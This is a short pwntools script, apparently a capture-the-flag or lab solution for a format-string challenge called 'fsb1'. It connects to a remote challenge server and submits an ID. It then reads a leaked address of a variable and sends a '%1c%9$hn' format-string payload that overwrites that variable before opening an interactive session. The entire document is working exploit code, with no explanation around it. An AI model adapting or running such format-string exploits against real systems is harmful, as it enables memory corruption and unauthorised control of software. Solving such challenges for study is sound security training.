from pwn import *

# target = process('./fsb1')
target = remote('8.154.20.109', 10300)
target.recv()
target.sendline("3220103544")

target.recvuntil(b"address of x is: ")
x_addr = eval(target.recv(14).decode())
print(f"Address of x: {hex(x_addr)}")


payload = ""
payload += "%1c%9$hn"
payload = payload.encode().ljust(8, b"\x00")
payload += p64(x_addr)


target.recv()
target.sendline(payload)

target.interactive()